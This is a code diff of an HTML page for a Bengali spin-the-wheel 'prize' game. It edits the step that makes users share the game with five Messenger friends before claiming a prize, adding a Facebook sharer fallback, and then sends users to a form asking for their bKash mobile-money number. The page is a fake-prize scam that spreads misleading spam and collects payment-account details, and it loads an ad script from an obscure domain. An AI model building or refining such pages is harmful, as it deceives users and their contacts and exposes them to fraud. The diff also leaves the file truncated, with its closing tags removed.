@@ -142,21 +142,19 @@
             max-width: 468px;
         }
 
-        /* Share confirmation tick style */
         #shareConfirmationTick {
-            display: none; /* Initially hidden */
+            display: none;
             position: fixed;
             top: 20px;
             right: 20px;
-            background-color: #2ecc71; /* Green color */
+            background-color: #2ecc71;
             color: white;
-            width: 40px; /* Circle size */
-            height: 40px; /* Circle size */
-            border-radius: 50%; /* Make it a circle */
-            font-size: 18px; /* Icon size */
-            z-index: 1000; /* Ensure it's on top */
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            font-size: 18px;
+            z-index: 1000;
             box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            /* Flexbox to center the icon inside the circle */
             justify-content: center;
             align-items: center;
         }
@@ -233,7 +231,6 @@
         <script type="text/javascript" src="//entertainedmagneticclients.com/715d262e52c4b70f631fa9759104e1d6/invoke.js"></script>
     </div>
 
-    <!-- Share Confirmation Tick Element -->
     <div id="shareConfirmationTick">
         <i class="fas fa-check"></i>
     </div>
@@ -310,17 +307,17 @@
              setTimeout(() => {
                  resultDiv.innerHTML = `<span class="congrats-text">অভিনন্দন!</span> আপনি <span class="prize-amount-text">${wonPrize.label}</span> জিতেছেন।`;
                  resultDiv.style.display = 'block';
-                 shareMessagePara.innerHTML = `আপনার <span class="prize-amount-text">${wonPrize.label}</span> পুরস্কারটি পেতে, <span class="share-instruction-text">দয়া করে প্রথমে ৫ জন বন্ধুকে এই গেমটি ফেসবুক মেসেঞ্জারে শেয়ার করুন।</span>`;
+                 shareMessagePara.innerHTML = `আপনার <span class="prize-amount-text">${wonPrize.label}</span> পুরস্কারটি পেতে, <span class="share-instruction-text">দয়া করে প্রথমে ৫ জন বন্ধুকে এই গেমটি ফেসবুক মেসেঞ্জারে অথবা অন্য কোনো মাধ্যমে শেয়ার করুন।</span>`;
                  shareSection.style.display = 'block';
                  shareButton.disabled = false;
              }, 5000);
         });
 
         function showShareConfirmationVisual() {
-            shareConfirmationTick.style.display = 'flex'; // Show and use flex for centering icon
+            shareConfirmationTick.style.display = 'flex';
             setTimeout(() => {
                 shareConfirmationTick.style.display = 'none';
-            }, 2500); // Show for 2.5 seconds
+            }, 2500);
         }
 
         shareButton.addEventListener('click', () => {
@@ -329,6 +326,8 @@
             const shareMessageForFriends = `আমি "${wonPrize.label}" জিতেছি টাকার চাকা গেম খেলে! 🤑 তুমিও খেলতে পারো আর জিততে পারো আকর্ষণীয় পুরস্কার! গেমটি অন্তত ৫ জন বন্ধুকে মেসেঞ্জারে শেয়ার করলে নাকি আরও বোনাস আছে! 😉`;
 
             if (navigator.share) {
+                // Use Web Share API - এটি ব্যবহারকারীর ডিভাইসের সকল শেয়ারিং অপশন দেখাবে,
+                // যার মধ্যে ফেসবুক মেসেঞ্জার (যদি ইনস্টল করা থাকে) অন্তর্ভুক্ত থাকবে।
                 navigator.share({
                     title: 'টাকার চাকা - ঘুরে গেল আমার ভাগ্য!',
                     text: shareMessageForFriends,
@@ -342,28 +341,39 @@
                 })
                 .catch((err) => {
                     console.error('Error sharing or share cancelled by user:', err);
-                    showShareConfirmationVisual(); // Still show visual feedback
+                    showShareConfirmationVisual();
                     shareMessagePara.innerHTML = `<span class="share-instruction-text">শেয়ার প্রক্রিয়া সম্পন্ন হয়েছে অথবা বাতিল করা হয়েছে। পরবর্তী ধাপে যান।</span>`;
-                     // Keep shareSection visible for a moment with the new message
                     setTimeout(() => {
                          shareSection.style.display = 'none';
                          scheduleBikashBox();
-                    }, 2000); // Then proceed
+                    }, 2000);
                 });
             } else {
-                // Fallback for browsers/devices that don't support navigator.share
-                const alertMessage = `আপনার ব্রাউজার সরাসরি শেয়ার সমর্থন করে না। 
-                
+                // navigator.share সাপোর্ট না করলে (যেমন কিছু ডেস্কটপ ব্রাউজার)
+                // ফেসবুকের sharer.php ব্যবহার করা হবে, যা নতুন ট্যাবে খুলবে।
+                // ব্যবহারকারী সেখান থেকে মেসেঞ্জারেও শেয়ার করতে পারবে।
+                const fbSharerUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(gameLink)}"e=${encodeURIComponent(shareMessageForFriends)}`;
+                const newWindow = window.open(fbSharerUrl, '_blank', 'noopener,noreferrer');
+
+                if (newWindow) {
+                    // উইন্ডো খোলা সম্ভব হয়েছে বলে ধরে নেওয়া হচ্ছে।
+                    showShareConfirmationVisual();
+                    shareSection.style.display = 'none';
+                    scheduleBikashBox();
+                } else {
+                    // পপ-আপ ব্লকার বা অন্য কোনো কারণে উইন্ডো খোলা যায়নি।
+                    const alertMessage = `ফেসবুকে শেয়ার করার উইন্ডোটি খোলা যায়নি (সম্ভবত পপ-আপ ব্লকার)। 
+                    
 এই গেমটি আপনার ৫ জন বন্ধুকে ফেসবুক মেসেঞ্জারে শেয়ার করতে, অনুগ্রহ করে নিচের লেখাটি কপি করুন এবং মেসেঞ্জারে পেস্ট করে পাঠান:
 
 "${shareMessageForFriends} খেলার লিংক: ${gameLink}"
 
 শেয়ার করার পর এই পেজে ফিরে এসে আপনার পুরস্কার দাবি করতে পারবেন।`;
-                alert(alertMessage);
-                
-                showShareConfirmationVisual(); // Show visual feedback
-                shareSection.style.display = 'none';
-                scheduleBikashBox();
+                    alert(alertMessage);
+                    showShareConfirmationVisual();
+                    shareSection.style.display = 'none';
+                    scheduleBikashBox();
+                }
             }
         });
 
@@ -378,7 +388,7 @@
             setTimeout(() => {
                 bikashSection.style.display = 'block';
                 bikashNumberInput.focus();
-            }, 1000); // Reduced delay for quicker access after share interaction
+            }, 1000);
         }
 
         sendBikashButton.addEventListener('click', () => {
@@ -401,12 +411,4 @@
                 var later = function() { timeout = null; if (!immediate) func.apply(context, args); };
                 var callNow = immediate && !timeout;
                 clearTimeout(timeout); timeout = setTimeout(later, wait);
-                if (callNow) func.apply(context, args);
-            };
-        };
-        var recalculateWheel = debounce(function() { setupWheelLabels(); }, 250);
-        window.addEventListener('DOMContentLoaded', () => { setTimeout(setupWheelLabels, 0); });
-        window.addEventListener('resize', recalculateWheel);
-    </script>
-</body>
-</html>
+           
